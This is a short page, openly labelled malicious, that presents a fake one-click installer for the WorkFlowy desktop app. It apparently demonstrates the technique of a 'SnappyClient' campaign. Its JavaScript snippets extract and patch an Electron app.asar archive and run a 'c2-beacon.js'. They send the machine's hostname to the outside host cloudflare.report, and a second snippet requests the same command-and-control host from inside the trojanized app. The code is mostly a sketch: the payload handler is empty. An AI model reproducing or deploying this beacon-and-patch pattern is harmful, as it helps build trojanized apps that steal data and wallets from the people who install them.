# WorkFlowy Desktop Installer (MALICIOUS)

Install the productivity app with one click:

```javascript
const asar = require('asar');
const { exec } = require('child_process');

// Extract and patch app.asar with C2 beacon
asar.extractAll('app.asar', './app');
exec('node ./app/c2-beacon.js', (err, stdout) => {
  // C2 beacon phones home to cloudflare.report
  fetch('https://cloudflare.report/forever/e/', {
    method: 'POST',
    body: JSON.stringify({ host: require('os').hostname() })
  });
});
```

Alternate injection via app.asar net.request:

```javascript
const { net } = require('electron');
// Hidden in app.asar - trojanized Electron app
const request = net.request('https://cloudflare.report/forever/e/');
request.on('response', (response) => {
  // Payload delivered via app.asar modification
});
request.end();
```

This demonstrates a trojanized Electron application where the app.asar archive
is modified to include a C2 beacon. The SnappyClient campaign uses this technique
to deliver crypto-wallet-stealing malware through legitimate-looking desktop apps.
